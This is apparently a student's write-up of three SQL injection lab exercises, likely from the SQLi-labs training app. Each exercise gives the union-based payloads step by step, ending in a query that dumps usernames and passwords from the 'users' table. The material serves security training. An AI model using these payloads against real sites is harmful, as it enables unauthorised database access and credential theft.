DONE BY : J.SAMPAT SRIVATSAV 

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

Q1:
		payload:
		?id = -1’ union select 1,2,3-- - **"Through this we got to know that everything in the 2nd and 3rd position is reflected in the output"**
		Now if we see the cotents of 'information_schema' ; we can see that there is a table 'tables' in that . It has an attribute 'table_schema' that contains database names and another attribute 			'table_name' that contains names .
		payload:
		?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- -
		similarly for columns ; 
		payload:
		?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' and table_schema='security'-- - 
		Finally ; this is the correct payload .
		payload:
		?id=-1' union select 1,group_concat(username),group_concat(password)from users-- -

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

Q2:
		We will find the error if we put ?id=-1'
		payload:
		?id=-1 union select 1,2,3-- -
		Now if we see the cotents of 'information_schema' ; we can see that there is a table 'tables' in that . It has an attribute 'table_schema' that contains database names and another attribute 			'table_name' that contains names.
		payload:
		?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- -
		The table 'users' contains details of username and password and can be accessed through the following payload
		payload:
		?id=-1 union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name='users' and table_schema='security'-- -
		The final payload:
		?id=-1 union select 1,group_concat(username),group_concat(password)from users-- -

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

Q3:
		This is the payload to know about the details of the databases which was stored . 
		?id=-1') union select 1,2,database()-- -
		This is the payload to get the details of attributes .
		?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- -
		Now we will be retrieving from 'users' table .
		?id=-1') union select 1,group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where TABLE_NAME = 'users' and table_schema='security'-- -
		And the final payload is as follows .
		?id=-1') union select 1,group_concat(username),group_concat(password) from security.users-- -

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
